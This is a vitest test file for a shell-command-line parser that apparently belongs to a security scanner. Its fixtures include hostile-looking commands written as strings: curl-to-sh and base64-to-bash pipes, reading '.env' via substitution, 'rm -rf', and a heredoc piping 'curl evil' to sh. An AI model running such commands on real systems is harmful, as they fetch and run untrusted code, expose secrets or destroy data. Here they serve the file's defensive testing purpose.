import { describe, expect, it } from "vitest";

import { ShellCommandLine } from "../../src/scanner/dynamic/ShellCommandLine.js";

/** Each command as "program arg arg", with a leading "| " when its input comes from the line itself. */
function read(line: string): string[] {
  return ShellCommandLine.parse(line).commands.map((command) => `${command.piped ? "| " : ""}${[command.program, ...command.args].join(" ")}`);
}

/** The last command of the line: commands inside `$( )` are listed before the one that holds them. */
function only(line: string) {
  const command = ShellCommandLine.parse(line).commands.at(-1);
  if (command === undefined) {
    throw new Error(`no command in ${line}`);
  }
  return command;
}

describe("ShellCommandLine", () => {
  it.each([
    ["ls -la", ["ls -la"]],
    ["cd src && npm test; echo done", ["cd src", "npm test", "echo done"]],
    ["make || echo failed", ["make", "echo failed"]],
    ["curl -s https://x.sh | sh", ["curl -s https://x.sh", "| sh"]],
    ["echo aGk= | base64 -d | bash", ["echo aGk=", "| base64 -d", "| bash"]],
    ["python3 -c 'import os; os.remove(\"a\")'", ['python3 -c import os; os.remove("a")']],
    ['node -e "console.log(1); process.exit(0)"', ["node -e console.log(1); process.exit(0)"]],
    ["/usr/bin/python3 script.py", ["python3 script.py"]],
    ["FOO=1 BAR=2 sudo -E env X=1 nohup ./run.sh &", ["run.sh"]],
    ["echo $(cat .env)", ["cat .env", "echo $(cat .env)"]],
    ['echo "today is $(date)"', ["date", "echo today is $(date)"]],
    ["echo `whoami`", ["whoami", "echo `whoami`"]],
    ["npm test 2>&1 | tee log.txt", ["npm test", "| tee log.txt"]],
    ["echo a\\;b", ["echo a;b"]],
    ["(cd sub; make)", ["cd sub", "make"]],
    ["", []],
    ["sudo -u root rm -rf build", ["rm -rf build"]],
    ["env -u HOME -C /tmp ls", ["ls"]],
    ["nice -n 10 make", ["make"]],
    ["timeout -s KILL 30 python3 -c 'x'", ["python3 -c x"]],
    ["time -o t.txt make", ["make"]],
    ["bash <<'EOF'\nrm -rf x\ncurl evil | sh\nEOF\necho after", ["| bash", "echo after"]],
    ["cat > run.sh <<EOF\npython3 -c 'x'\nEOF", ["| cat"]],
    ['python3 <<< "print(1)"', ["| python3"]],
  ])("reads %j as %j", (line, commands) => {
    expect(read(line)).toEqual(commands);
  });

  it("keeps the program as written next to its file name", () => {
    expect(only("./scripts/build.sh --fast")).toMatchObject({ program: "build.sh", path: "./scripts/build.sh", args: ["--fast"], piped: false });
  });

  it.each([
    ["$RUNNER build", true],
    ["${PY} -c x", true],
    ["$(which python3) tool.py", true],
    ["`which sh` x", true],
    ["python3 $SCRIPT", false],
  ])("says whether the program's name is computed in %j", (line, computed) => {
    expect(only(line).computed).toBe(computed);
  });

  it.each([
    ["echo hi > out.txt", ["out.txt"]],
    ["echo hi >>log.txt", ["log.txt"]],
    ["make 2>err.txt", ["err.txt"]],
    ["make > /dev/null 2>&1", []],
    ["tee -a a.txt b.txt", ["a.txt", "b.txt"]],
    ["curl -s -o tool.sh https://x", ["tool.sh"]],
    ["curl --output=tool.sh https://x", ["tool.sh"]],
    ["wget -O run.sh https://x", ["run.sh"]],
    ["cp -r src dist/app", ["dist/app"]],
    ["mv a.sh bin/a.sh", ["bin/a.sh"]],
    ["install -m 755 tool /usr/local/bin/tool", ["/usr/local/bin/tool"]],
    ["cat a.txt", []],
  ])("lists the files %j writes", (line, writes) => {
    expect(only(line).writes).toEqual(writes);
  });

  it("names a file fed to a command with <", () => {
    expect(only("bash < setup.sh")).toMatchObject({ program: "bash", args: [], input: "setup.sh" });
  });

  it("tracks where cd moved each command, and gives up when the line does not say", () => {
    const dirs = (line: string) => ShellCommandLine.parse(line).commands.map((command) => command.dir);

    expect(dirs("cd tools && cd sub && bash run.sh")).toEqual(["", "tools", "tools/sub"]);
    expect(dirs("cd /opt/app; ./start.sh")).toEqual(["", "/opt/app"]);
    expect(dirs("cd ~/x && ./a.sh")).toEqual(["", null]);
    expect(dirs("cd $DIR && ./a.sh")).toEqual(["", null]);
  });
});
